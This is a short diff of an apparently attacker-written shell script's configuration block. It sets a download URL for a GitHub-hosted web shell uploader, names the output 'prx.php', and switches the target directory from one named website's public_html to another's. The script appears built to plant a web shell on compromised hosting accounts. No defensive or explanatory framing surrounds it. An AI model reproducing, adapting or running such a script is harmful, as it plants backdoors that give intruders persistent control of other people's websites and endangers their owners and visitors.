@@ -2,7 +2,7 @@
 
 # Konfigurasi
 URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/uploader.php"
-DOWNLOAD_DIR="/home/customer/www/course.coloradocounselortraining.com/public_html"
+DOWNLOAD_DIR="/home/u377796280/domains/qualitymersin.com/public_html/"
 OUTPUT_FILE="prx.php"
 OUTPUT_PATH="$DOWNLOAD_DIR/$OUTPUT_FILE"
 
